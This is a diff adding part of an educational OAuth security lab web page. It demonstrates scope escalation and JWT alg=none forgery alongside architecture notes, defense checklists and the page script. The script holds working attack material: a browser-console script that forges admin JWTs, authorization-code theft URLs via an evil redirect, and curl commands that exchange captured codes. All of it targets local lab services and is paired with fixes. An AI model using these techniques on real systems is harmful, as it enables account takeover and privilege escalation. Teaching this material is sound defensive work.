+  <p><strong>The bug:</strong> In VULNERABLE mode: <code>return requested</code> — the server returns all requested scopes with no validation. An attacker adds <code>admin write</code> to the scope parameter and gets a token with those privileges.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span><code>legitimate-client</code> is registered for: <code>read profile email</code>. The attack URL requests <code>read profile email admin write</code> — in VULNERABLE mode all are granted.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Open this attack URL</strong> — it's a normal OAuth authorize request from <code>legitimate-client</code> but with <code>scope=read+profile+email+admin+write</code> appended. The redirect goes to the legitimate callback (not the attacker) so the token lands on the client app.</p>
+      <div class="cb"><div class="cb-head"><span>Scope escalation URL — extra scopes added</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-open" id="a6-openbtn">Open ↗</button></div></div><pre class="cc" id="a6-url">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p>Log in as <code>alice / password123</code> and Allow Access. You'll be redirected to <code>/attack-callback</code> — a special callback endpoint that skips CSRF state validation for this demo. The token is displayed in the browser with all scopes visible.</p>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p><strong>Verify the token has admin scope</strong> by calling the admin API. Copy the <code>access_token</code> from localStorage (DevTools → Application → Local Storage → access_token) and paste it below.</p>
+      <div class="example-box"><span class="ex-label">🔍 How to confirm scope escalation worked</span>1. Open DevTools after Step 2
+2. Go to Application → Local Storage → http://localhost:3002
+3. Copy "access_token" (the eyJ... string)
+4. Decode it at jwt.io — check the "scope" field in the payload
+5. VULNERABLE: scope = "read profile email admin write"  ← escalated!
+6. SECURE: scope = "read profile email"  ← only registered scopes</div>
+      <div class="cb"><div class="cb-head"><span>Call admin API with escalated token</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a6-curl')">▶ Run</button></div></div><pre class="cc" id="a6-curl">loading…</pre></div>
+      <div class="paste-row" id="pr-a6-curl"><label>📋 Paste access token:</label><input id="inp-a6-curl" type="text" placeholder="Paste the eyJ… token from /attack-callback page" oninput="setPlaceholder(this,'a6-curl','PASTE_ACCESS_TOKEN_WITH_ADMIN_SCOPE')"><button class="apply-btn" onclick="applyPaste('inp-a6-curl','a6-curl','PASTE_ACCESS_TOKEN_WITH_ADMIN_SCOPE')">Apply →</button></div>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — auth-server/src/routes/auth.js</div>
+    <div class="dc v">function validateScopes(requested, registered) {
+  return requested;  // returns ALL requested scopes — no validation
+}</div>
+    <div class="dh s">🟢 SECURE — intersection only</div>
+    <div class="dc s">function validateScopes(requested, registered) {
+  return requested.filter(s => registered.includes(s));
+  // legitimate-client registered: ['read','profile','email']
+  // requested: ['read','profile','email','admin','write']
+  // intersection: ['read','profile','email'] — admin and write stripped ✅
+}</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 7 ══ -->
+<div class="pg" id="pg-a7">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">07</div>
+      <div>
+        <div class="hero-title">JWT Algorithm Confusion (alg=none)</div>
+        <div class="hero-sub">CVE-2015-9235 — The resource server uses <code>jwt.decode()</code> instead of <code>jwt.verify()</code>. decode() only Base64-decodes the payload — it never checks the signature. A crafted token with any claims is accepted.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-cr">CRIT</span><span class="fbadge">resource-server/src/server.js → requireAuth()</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>A JWT has three parts: <code>header.payload.signature</code>. When <code>alg=none</code> is set in the header, no signature is required — the signature field is empty. A properly implemented server must <em>reject</em> alg=none tokens.</p>
+  <p><strong>The bug:</strong> The resource server uses <code>jwt.decode(token)</code> which does <em>not</em> verify the signature. It just Base64-decodes the payload. An attacker can forge any claims (sub, scope, roles) without knowing the signing secret.</p>
+  <p>You can forge tokens entirely in your browser — the ▶ Run Forged buttons below build and fire the token automatically. No copy-pasting needed.</p>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Forge a profile token</strong> — sets <code>alg=none</code>, claims <code>scope: "read profile"</code>, signs with empty signature. Click ▶ Run Forged — it builds the JWT in JavaScript and calls <code>/api/profile</code> automatically.</p>
+      <div class="example-box"><span class="ex-label">🔧 What the forged token looks like</span>Header: {"alg":"none","typ":"JWT"}  → <strong>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</strong>
+Payload: {"sub":"alice","scope":"read profile","roles":["user"],...}  → <strong>eyJzdWIiOiJhbGljZSIsInNjb3BlIjoicmVhZCBwcm9maWxlI...</strong>
+Signature: <strong>[EMPTY]</strong>  ← no signing key needed!
+<br>Final token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<strong style="color:var(--red)">eyJzdWIiOiJhbGljZSI...</strong>. (ends with a dot)</div>
+      <div class="cb"><div class="cb-head"><span>Forge profile token — alg=none, scope: read profile</span><div class="cb-acts"><button class="btn-run" onclick="runForgedToken('a7-profile','read profile',['user'])">▶ Run Forged</button></div></div><pre class="cc" id="a7-profile">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p><strong>Forge an ADMIN token</strong> — same technique but with <code>scope: "read write admin"</code> and <code>roles: ["user","admin"]</code>. This grants full admin access with no valid JWT secret.</p>
+      <div class="cb"><div class="cb-head"><span>Forge admin token — alg=none, scope: admin</span><div class="cb-acts"><button class="btn-run" onclick="runForgedToken('a7-admin','read write admin',['user','admin'])">▶ Run Forged</button></div></div><pre class="cc" id="a7-admin">loading…</pre></div>
+      <div class="example-box"><span class="ex-label">✅ VULNERABLE result</span>[{"id":"user-1","username":"alice"},{"id":"user-2","username":"admin"}]  ← full user list!
+<span class="ex-label" style="margin-top:6px">❌ SECURE result</span>{"error":"invalid_token","error_description":"Token algorithm not allowed"}</div>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p>You can also build tokens manually using this script and paste the result into any Authorization header:</p>
+      <div class="cb"><div class="cb-head"><span>Manual forgery script (run in browser console)</span><button class="btn-copy" onclick="cpb(this)">Copy</button></div><pre class="cc" id="a7-script">loading…</pre></div>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — resource-server/src/server.js</div>
+    <div class="dc v">// jwt.decode() ONLY Base64-decodes — no signature verification!
+decoded = jwt.decode(token);
+// alg=none tokens accepted, forged claims trusted, no iss/aud check</div>
+    <div class="dh s">🟢 SECURE — jwt.verify() with algorithm whitelist</div>
+    <div class="dc s">decoded = jwt.verify(token, JWT_SECRET, {
+  algorithms: ['HS256'],    // ← whitelist — rejects alg=none
+  issuer: AUTH_SERVER_URL,  // ← validates iss claim
+  audience: RESOURCE_URL    // ← validates aud claim
+});</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ARCHITECTURE ══ -->
+<div class="pg" id="pg-arch">
+  <div class="eyebrow">Reference</div>
+  <h1>Lab Architecture 🏗</h1>
+  <p class="lead">How the Authorization Code Flow works across the five lab services — with PKCE, JWT token structure, and refresh token rotation.</p>
+
+  <h2>Authorization Code Flow</h2>
+  <table>
+    <thead><tr><th>Step</th><th>Direction</th><th>What Happens</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>User → Browser</td><td>Click Login on the Client App</td></tr>
+      <tr><td>2</td><td>Browser → Auth Server</td><td>GET /oauth/authorize with <code>client_id</code>, <code>redirect_uri</code>, <code>scope</code>, <code>state</code>, <code>code_challenge</code></td></tr>
+      <tr><td>3</td><td>Auth Server → Browser</td><td>Renders login + consent screen</td></tr>
+      <tr><td>4</td><td>Auth Server → Browser</td><td>302 redirect to <code>redirect_uri?code=AUTH_CODE&state=…</code></td></tr>
+      <tr><td>5</td><td>Client App → Auth Server</td><td>POST /oauth/token: <code>code</code>, <code>code_verifier</code>, <code>client_id</code>, <code>client_secret</code></td></tr>
+      <tr><td>6</td><td>Auth Server → Client</td><td><code>{access_token, refresh_token, expires_in, token_type}</code></td></tr>
+      <tr><td>7</td><td>Client → Resource API</td><td>GET /api/profile with <code>Authorization: Bearer {access_token}</code></td></tr>
+      <tr><td>8</td><td>Resource API</td><td>Verify JWT signature + algorithm whitelist + iss + aud + scopes → return data</td></tr>
+    </tbody>
+  </table>
+
+  <h2>JWT Access Token Structure</h2>
+  <div class="cb"><div class="cb-head"><span>JWT structure — header.payload.signature</span><button class="btn-copy" onclick="cpb(this)">Copy</button></div><pre class="cc">// Header (Base64URL decoded)
+{ "alg": "HS256", "typ": "JWT" }
+
+// Payload (Base64URL decoded)
+{
+  "jti": "unique-token-id",
+  "sub": "user-id",
+  "username": "alice",
+  "client_id": "legitimate-client",
+  "scope": "read profile email",
+  "roles": ["user"],
+  "iss": "http://localhost:3001",
+  "aud": "http://localhost:3003",
+  "exp": 1234567890,   // iat + 3600 seconds
+  "iat": 1234564290
+}
+
+// Signature = HMACSHA256(base64url(header) + "." + base64url(payload), JWT_SECRET)
+// Final token = base64url(header) + "." + base64url(payload) + "." + base64url(sig)</pre></div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ DEFENSE ══ -->
+<div class="pg" id="pg-def">
+  <div class="eyebrow">Reference</div>
+  <h1>Defense Strategies 🛡</h1>
+  <p class="lead">Production checklists and mitigation patterns for each OAuth vulnerability in this lab.</p>
+
+  <h2>Defense-in-Depth Layers</h2>
+  <table>
+    <thead><tr><th>Layer</th><th>Controls</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Protocol</strong></td><td>Exact redirect URI matching · PKCE required (S256) · State parameter CSRF check · Auth codes single-use, 5 min TTL</td></tr>
+      <tr><td><strong>Token Security</strong></td><td>Short-lived access tokens (≤1h) · Refresh token rotation · JWT algorithm whitelist · HttpOnly cookies</td></tr>
+      <tr><td><strong>Authorization</strong></td><td>Scope intersection enforcement · Privileged scope admin approval · Least-privilege principle</td></tr>
+      <tr><td><strong>Detection</strong></td><td>Comprehensive audit logging · Refresh token reuse detection · Anomaly alerting on monitoring dashboard</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Authorization Server Checklist</h2>
+  <ul class="chk">
+    <li>Exact redirect URI matching — no wildcards, no prefix match, no substring match (RFC 6749 §3.1.2)</li>
+    <li>PKCE required (S256 method only) for all public clients — <code>plain</code> method is insufficient</li>
+    <li>State parameter validated on every callback — prevents CSRF on the authorization flow</li>
+    <li>Authorization codes expire in ≤ 5 minutes and are single-use only</li>
+    <li>Scope intersection enforced: <code>granted = requested ∩ registered</code></li>
+    <li>Privileged scopes require explicit admin pre-approval per client</li>
+  </ul>
+
+  <h2>Token Management Checklist</h2>
+  <ul class="chk">
+    <li>Access tokens expire in ≤ 1 hour</li>
+    <li>Refresh tokens expire in ≤ 30 days</li>
+    <li>Refresh token rotation on every use — old token revoked immediately</li>
+    <li>JWT verified with <code>jwt.verify()</code> and <code>algorithms: ['HS256']</code> — never accept alg=none</li>
+    <li><code>iss</code> and <code>aud</code> claims validated on every resource server request</li>
+  </ul>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ QUICK REF ══ -->
+<div class="pg" id="pg-ref">
+  <div class="eyebrow">Reference</div>
+  <h1>Quick Reference ⚡</h1>
+  <p class="lead">All endpoints, curl commands, OAuth clients, and credentials in one place.</p>
+
+  <h2>OAuth Clients</h2>
+  <table>
+    <thead><tr><th>Client ID</th><th>Secret</th><th>PKCE</th><th>Used For</th></tr></thead>
+    <tbody>
+      <tr><td><code>legitimate-client</code></td><td><code>legitimate-secret-abc123</code></td><td>No</td><td>Attacks 1, 2, 5, 6</td></tr>
+      <tr><td><code>secure-client</code></td><td><code>secure-secret-xyz789</code></td><td>Yes (S256)</td><td>Secure PKCE flow</td></tr>
+      <tr><td><code>malicious-client</code></td><td><code>evil-secret-666</code></td><td>No</td><td>Attack 4 — consent abuse</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Key curl Commands</h2>
+  <div class="cb"><div class="cb-head"><span>Exchange authorization code for tokens</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button></div></div><pre class="cc" id="qr-exchange">loading…</pre></div>
+  <div class="cb"><div class="cb-head"><span>Use refresh token</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button></div></div><pre class="cc" id="qr-refresh">loading…</pre></div>
+  <div class="cb"><div class="cb-head"><span>Call protected API</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button></div></div><pre class="cc" id="qr-api">loading…</pre></div>
+
+  <h2>All Endpoints</h2>
+  <div class="llist" id="all-eps">loading…</div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+</main>
+</div><!-- #shell -->
+
+<!-- CONSOLE -->
+<div id="con">
+  <div id="con-hd">
+    <div id="con-title">▶_ Console <span id="con-hint">· Lab endpoints only · Rate-limited · No shell access</span></div>
+    <button id="con-x" onclick="togCon()">✕</button>
+  </div>
+  <div id="con-out"><span class="cl dim">OAuth Security Lab Console — Ready
+Shortcuts: AUTH, RESOURCE, ATTACKER, MONITOR, CLIENT resolve to running service URLs.
+Examples:
+  curl AUTH/health
+  curl RESOURCE/api/profile -H "Authorization: Bearer TOKEN"
+  curl -X POST AUTH/oauth/token -d "grant_type=refresh_token&refresh_token=rt_TOKEN&client_id=legitimate-client&client_secret=legitimate-secret-abc123"
+</span></div>
+  <div id="con-row">
+    <span id="con-ps">$</span>
+    <input id="con-in" type="text" placeholder='curl RESOURCE/api/profile -H "Authorization: Bearer TOKEN"' autocomplete="off" spellcheck="false">
+    <button id="con-go" onclick="sendCon()">Run</button>
+  </div>
+</div>
+<button class="con-fab" onclick="togCon()">▶_ Console</button>
+
+<script>
+'use strict';
+
+// ── URL store ─────────────────────────────────────────────────────────────────
+const base = window.location.origin;
+const p = n => base.replace(/:\d+$/, '') + ':' + n;
+let U = { client: base, auth: p(3001), resource: p(3003), attacker: p(3004), monitor: p(3005) };
+let vuln = true;
+let latestCode = null;
+let latestToken = null;
+
+// ── Theme ─────────────────────────────────────────────────────────────────────
+function toggleTheme() {
+  const html = document.documentElement;
+  const isLight = html.getAttribute('data-theme') === 'light';
+  html.setAttribute('data-theme', isLight ? 'dark' : 'light');
+  document.getElementById('themeBtn').textContent = isLight ? '☀️ Light' : '🌙 Dark';
+  try { localStorage.setItem('theme', isLight ? 'dark' : 'light'); } catch(e) {}
+}
+try {
+  const t = localStorage.getItem('theme');
+  if (t) {
+    document.documentElement.setAttribute('data-theme', t);
+    document.getElementById('themeBtn').textContent = t === 'dark' ? '☀️ Light' : '🌙 Dark';
+  }
+} catch(e) {}
+
+// ── Config load ───────────────────────────────────────────────────────────────
+async function loadCfg() {
+  try {
+    const d = await fetch('/api/mode', { signal: AbortSignal.timeout(3000) }).then(r => r.json());
+    if (d.authUrl)     U.auth     = d.authUrl;
+    if (d.resourceUrl) U.resource = d.resourceUrl;
+    if (d.attackerUrl) U.attacker = d.attackerUrl;
+    if (d.monitorUrl)  U.monitor  = d.monitorUrl;
+    if (d.baseUrl)     U.client   = d.baseUrl;
+    vuln = d.vulnerable !== undefined ? d.vulnerable : true;
+    updMode();
+  } catch(e) { /* services not yet ready */ }
+  // Load latest captured code/token from attacker server
+  try {
+    const resp = await fetch('/api/curl-proxy', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ service: 'attacker', path: '/api/latest', method: 'GET', headers: {} })
+    });
+    const data = await resp.json();
+    if (data.body) {
+      const body = typeof data.body === 'string' ? JSON.parse(data.body) : data.body;
+      if (body.code) latestCode = body.code;
+      if (body.token) latestToken = body.token;
+    }
+  } catch(e) {}
+  inject();
+}
+
+function updMode() {
+  const btn = document.getElementById('modeBtn');
+  const dot = document.getElementById('mdot');
+  const lbl = document.getElementById('mlbl');
+  if (vuln) {
+    btn.className = 'mode-btn vuln'; dot.className = 'mdot vuln'; lbl.textContent = 'VULNERABLE';
+  } else {
+    btn.className = 'mode-btn sec'; dot.className = 'mdot sec'; lbl.textContent = 'SECURE';
+  }
+  const ms = document.getElementById('mcStatus');
+  const md = document.getElementById('mcDesc');
+  const mb = document.getElementById('mcBtn');
+  if (ms) {
+    ms.textContent = vuln ? '🔴 VULNERABLE MODE active' : '🟢 SECURE MODE active';
+    ms.style.color = vuln ? 'var(--red)' : 'var(--green)';
+    md.textContent = vuln
+      ? 'All 7 attacks are exploitable. Tokens in localStorage, PKCE disabled, redirect URIs use prefix matching, refresh tokens never rotate.'
+      : 'All mitigations active. Tokens in HttpOnly cookies, PKCE required, exact URI matching, refresh tokens rotate on every use.';
+    mb.textContent = vuln ? 'Switch to 🟢 Secure Mode' : 'Switch to 🔴 Vulnerable Mode';
+    mb.style.background = vuln ? 'rgba(58,158,106,.1)' : 'rgba(224,90,58,.1)';
+    mb.style.color = vuln ? 'var(--green)' : 'var(--red)';
+    mb.style.borderColor = vuln ? 'var(--green)' : 'var(--red)';
+  }
+}
+
+async function doToggle() {
+  const btn = document.getElementById('modeBtn');
+  const ts = document.getElementById('toggle-status');
+  btn.style.opacity = '.4'; btn.onclick = null;
+  if (ts) { ts.textContent = '⏳ Toggling mode…'; ts.style.color = 'var(--orange)'; }
+  try {
+    const d = await fetch('/api/toggle-mode', { method: 'POST' }).then(r => r.json());
+    if (d.vulnerable !== undefined) {
+      vuln = d.vulnerable;
+      updMode();
+      inject();
+      const msg = `✅ Switched to ${d.vulnerable ? '🔴 VULNERABLE' : '🟢 SECURE'} mode. All commands updated.`;
+      if (ts) { ts.textContent = msg; ts.style.color = 'var(--green)'; setTimeout(() => { if(ts){ts.textContent='';ts.style.color='';} }, 4000); }
+      // Flash the nav badge
+      document.getElementById('modeBtn').style.transform = 'scale(1.1)';
+      setTimeout(() => { document.getElementById('modeBtn').style.transform = ''; }, 300);
+    }
+  } catch(e) {
+    const msg = '❌ Toggle failed — is the Auth Server running? Error: ' + e.message;
+    clog('er', msg);
+    if (ts) { ts.textContent = msg; ts.style.color = 'var(--red)'; }
+  }
+  btn.style.opacity = '1'; btn.onclick = doToggle;
+}
+
+// ── Inject all dynamic content ─────────────────────────────────────────────────
+function st(id, t) { const e = document.getElementById(id); if (e) { e.textContent = t; delete e.dataset.original; } }
+
+// ── Editable placeholder system ──────────────────────────────────────────────
+function setPlaceholder(inputEl, preId, placeholder) {
+  const pre = document.getElementById(preId);
+  if (!pre) return;
+  if (!pre.dataset.original) pre.dataset.original = pre.textContent;
+  const val = inputEl.value.trim();
+  const escaped = placeholder.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+  if (val) {
+    pre.textContent = pre.dataset.original.replace(new RegExp(escaped, 'g'), val);
+  } else {
+    pre.textContent = pre.dataset.original; // restore if cleared
+  }
+}
+// applyPaste: called by "Apply" button when code wasn't auto-filled
+function applyPaste(inputId, preId, placeholder) {
+  const inp = document.getElementById(inputId);
+  if (!inp) return;
+  const val = inp.value.trim();
+  if (!val) { inp.focus(); inp.style.borderColor = 'var(--red)'; setTimeout(()=>inp.style.borderColor='',1200); return; }
+  setPlaceholder(inp, preId, placeholder);
+  inp.style.borderColor = 'var(--green)';
+}
+// showPasteRow: show/hide paste row based on whether value was auto-filled
+function showPasteRow(rowId, filled) {
+  const row = document.getElementById(rowId);
+  if (!row) return;
+  if (filled) {
+    row.classList.add('pr-filled');
+    const lbl = row.querySelector('label');
+    if (lbl) lbl.textContent = '✅ Auto-filled from Attacker server';
+    const inp = row.querySelector('input'); if (inp) { inp.style.display='none'; }
+    const btn = row.querySelector('.apply-btn'); if (btn) btn.style.display='none';
+  } else {
+    row.classList.remove('pr-filled');
+  }
+}
+function sh(id, h) { const e = document.getElementById(id); if (e) e.href = h; }
+
+function codeVal() { return latestCode || 'PASTE_CODE_FROM_ATTACKER_DASHBOARD'; }
+function tokenVal() { return latestToken || 'PASTE_ACCESS_TOKEN_HERE'; }
+
+function inject() {
+  const A = U.auth, C = U.client, R = U.resource, ATK = U.attacker, M = U.monitor;
+
+  // Sidebar links
+  sh('sb-client', C + '/login');
+  sh('sb-auth',   A + '/.well-known/oauth-authorization-server');
+  sh('sb-res',    R + '/health');
+  sh('sb-atk',    ATK + '/dashboard');
+  sh('sb-mon',    M);
+
+  // Home service cards
+  sh('sc-auth',   A + '/.well-known/oauth-authorization-server'); st('u-auth', A);
+  sh('sc-res',    R + '/health');    st('u-res', R);
+  sh('sc-atk',    ATK + '/dashboard'); st('u-atk', ATK);
+  sh('sc-mon',    M);                st('u-mon', M);
+  st('u-client', C);
+  // client card — link to login
+  const scClient = document.getElementById('sc-client');
+  if (scClient) scClient.href = C + '/login';
+
+  showPasteRow('pr-a6-curl', !!latestToken); // token from /attack-callback
+  // Getting started monitoring link
+  const gsml = document.getElementById('gs-mon-link');
+  if (gsml) gsml.href = M;
+
+  // ── Attack 1 (evil-redirect passes prefix check on localhost:3002)
+  st('a1-mon', M);
+  st('a1-dash', ATK + '/dashboard');
+  const evilRedir = encodeURIComponent(C + '/evil-redirect');
+  const a1url = `${A}/oauth/authorize?response_type=code&client_id=legitimate-client&redirect_uri=${evilRedir}&scope=read+profile+email&state=attack1-demo`;
+  st('a1-url', a1url);
+  const a1btn = document.getElementById('a1-openbtn');
+  if (a1btn) a1btn.onclick = () => window.open(a1url, '_blank');
+  const code1 = codeVal();
+  st('a1-ex',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=authorization_code" \\\n  -d "code=${code1}" \\\n  -d "redirect_uri=${C}/evil-redirect" \\\n  -d "client_id=legitimate-client" \\\n  -d "client_secret=legitimate-secret-abc123"`);
+  const cs1 = document.getElementById('a1-code-status');
+  if (cs1) cs1.textContent = '';
+  showPasteRow('pr-a1-ex', !!latestCode);
+
+  // ── Attack 2 (same evil-redirect to capture code)
+  const a2url = `${A}/oauth/authorize?response_type=code&client_id=legitimate-client&redirect_uri=${encodeURIComponent(C+'/evil-redirect')}&scope=read+profile+email&state=attack2-demo`;
+  st('a2-url', a2url);
+  const a2btn = document.getElementById('a2-openbtn');
+  if (a2btn) a2btn.onclick = () => window.open(a2url, '_blank');
+  const code2 = codeVal();
+  st('a2-curl',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=authorization_code" \\\n  -d "code=${code2}" \\\n  -d "redirect_uri=${C}/evil-redirect" \\\n  -d "client_id=legitimate-client" \\\n  -d "client_secret=legitimate-secret-abc123"\n# No code_verifier — accepted in VULNERABLE mode, rejected in SECURE`);
+  st('a2-use',
+    `curl ${R}/api/profile \\\n  -H "Authorization: Bearer PASTE_ACCESS_TOKEN_HERE"\n# Paste the access_token from the response above (the eyJ... string)\n# VULNERABLE: 200 OK with profile data\n# SECURE: 401 Unauthorized`);
+  showPasteRow('pr-a2-curl', !!latestCode);
+
+  // ── Attack 3
+  st('a3-login', C + '/login');
+  st('a3-xss',   C + '/xss-demo');
+  st('a3-dash',  ATK + '/dashboard');
+  const tok3 = tokenVal();
+  st('a3-curl',
+    `curl ${R}/api/profile \\\n  -H "Authorization: Bearer ${tok3}"\n# VULNERABLE: 200 OK — stolen token from localStorage works\n# SECURE: 401 — token is in HttpOnly cookie, XSS cannot read it`);
+
+  // ── Attack 4
+  st('a4-phish', ATK + '/phishing');
+  st('a4-dash',  ATK + '/dashboard');
+  const code4 = codeVal();
+  st('a4-curl',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=authorization_code" \\\n  -d "code=${code4}" \\\n  -d "redirect_uri=${ATK}/capture" \\\n  -d "client_id=malicious-client" \\\n  -d "client_secret=evil-secret-666"`);
+  st('a4-admin',
+    `curl ${R}/api/admin/users \\\n  -H "Authorization: Bearer PASTE_ACCESS_TOKEN_HERE"\n# Paste the access_token from the response above (eyJ... string)\n# VULNERABLE: Returns full user list with admin-scoped token\n# SECURE: 403 — malicious-client cannot obtain admin scope`);
+  const cs4 = document.getElementById('a4-code-status');
+  if (cs4) cs4.textContent = '';
+  showPasteRow('pr-a4-curl', !!latestCode);
+
+  // ── Attack 5
+  st('a5-login', C + '/login');
+  st('a5-curl',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=refresh_token" \\\n  -d "refresh_token=PASTE_REFRESH_TOKEN" \\\n  -d "client_id=legitimate-client" \\\n  -d "client_secret=legitimate-secret-abc123"\n# VULNERABLE: Returns fresh access_token — same refresh_token works forever\n# SECURE: Old token revoked immediately — reuse returns 400 invalid_grant`);
+  st('a5-rtoks', A + '/admin/refresh-tokens');
+  const a5rtbtn = document.getElementById('a5-rtoks-btn');
+  if (a5rtbtn) a5rtbtn.onclick = () => window.open(A + '/admin/refresh-tokens', '_blank');
+
+  showPasteRow('pr-a5-curl', false); // refresh token always needs manual paste (from localStorage)
+  // ── Attack 6 (uses /attack-callback which has no state check — intentional for demo)
+  const a6url = `${A}/oauth/authorize?response_type=code&client_id=legitimate-client&redirect_uri=${encodeURIComponent(C+'/attack-callback')}&scope=read+profile+email+admin+write&state=attack6-demo`;
+  st('a6-url', a6url);
+  const a6btn = document.getElementById('a6-openbtn');
+  if (a6btn) a6btn.onclick = () => window.open(a6url, '_blank');
+  st('a6-curl',
+    `curl ${R}/api/admin/users \\\n  -H "Authorization: Bearer PASTE_ACCESS_TOKEN_WITH_ADMIN_SCOPE"\n# Paste access_token from localStorage after completing Step 2\n# Decode at jwt.io to confirm 'scope' field contains 'admin'\n# VULNERABLE: Returns full user list\n# SECURE: 403 — admin scope was stripped at authorization`);
+
+  // ── Attack 7
+  st('a7-forge', ATK + '/forge-jwt');
+  st('a7-profile',
+    `# This button builds a forged alg=none JWT in your browser\n# and sends it to ${R}/api/profile automatically.\n# No token or secret needed — the forgery is the attack.\n# VULNERABLE: 200 OK with alice's profile\n# SECURE: 401 — jwt.verify() rejects alg=none`);
+  st('a7-admin',
+    `# This button forges a JWT with scope="read write admin" and roles=["admin"]\n# and sends it to ${R}/api/admin/users automatically.\n# VULNERABLE: 200 OK — full user list returned\n# SECURE: 401 — jwt.verify() with algorithms:['HS256'] rejects`);
+  st('a7-script',
+    `const b = s => btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');\nconst h = b(JSON.stringify({ alg: "none", typ: "JWT" }));\nconst pl = b(JSON.stringify({\n  sub: "alice", username: "alice",\n  scope: "read write admin",\n  roles: ["user", "admin"],\n  iss: "${A}", aud: "${R}",\n  exp: Math.floor(Date.now()/1000) + 3600,\n  iat: Math.floor(Date.now()/1000)\n}));\nconst forgedToken = h + "." + pl + ".";  // empty signature — dot at end is intentional\nconsole.log("Forged token:", forgedToken);\n// Use as: Authorization: Bearer <forgedToken>`);
+
+  // Quick ref
+  st('qr-exchange',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=authorization_code" \\\n  -d "code=AUTH_CODE" \\\n  -d "redirect_uri=${C}/callback" \\\n  -d "client_id=legitimate-client" \\\n  -d "client_secret=legitimate-secret-abc123"`);
+  st('qr-refresh',
+    `curl -X POST ${A}/oauth/token \\\n  -d "grant_type=refresh_token" \\\n  -d "refresh_token=rt_YOUR_REFRESH_TOKEN" \\\n  -d "client_id=legitimate-client" \\\n  -d "client_secret=legitimate-secret-abc123"`);
+  st('qr-api',
+    `# Profile (read scope):\ncurl ${R}/api/profile -H "Authorization: Bearer ACCESS_TOKEN"\n\n# Admin users (admin scope):\ncurl ${R}/api/admin/users -H "Authorization: Bearer ACCESS_TOKEN"\n\n# JWT attack config:\ncurl ${R}/api/jwt-attack-demo`);
+
+  // All endpoints
+  const eps = [
+    [C + '/login',          '🔐 Client App — Login Page (Start Here)'],
+    [C + '/xss-demo',       '💉 Client App — XSS Demo (Attack 3)'],
+    [A + '/admin/audit-log','📋 Auth Server — Audit Log'],
+    [A + '/admin/tokens',   '🗝 Auth Server — Issued Tokens'],
+    [A + '/admin/refresh-tokens', '🔄 Auth Server — Refresh Token State'],
+    [A + '/admin/clients',  '📱 Auth Server — Registered Clients'],
+    [A + '/admin/mode',     '⚙️ Auth Server — Current Mode (JSON)'],
+    [A + '/.well-known/oauth-authorization-server', '🔑 Auth Server — OIDC Discovery'],
+    [R + '/health',         '🛡 Resource API — Health Check'],
+    [R + '/api/jwt-attack-demo', '🔬 Resource API — JWT Attack Config'],
+    [ATK + '/dashboard',    '💀 Attacker C2 — Captured Tokens & Codes'],
+    [ATK + '/forge-jwt',    '🔧 Attacker — JWT Forge Tool (Attack 7)'],
+    [ATK + '/phishing',     '🎣 Attacker — Phishing Page (Attack 4)'],
+    [ATK + '/capture',      '📡 Attacker — Code/Token Capture Endpoint'],
+    [M,                     '📊 Monitoring — Real-time Security Events'],
+  ];
+  const el = document.getElementById('all-eps');
+  if (el) el.innerHTML = eps.map(([u, l]) =>
+    `<a class="lrow" href="${esc(u)}" target="_blank"><span class="lrow-lbl">${l}</span><span class="lrow-url">${esc(u)}</span></a>`
+  ).join('');
+}
+
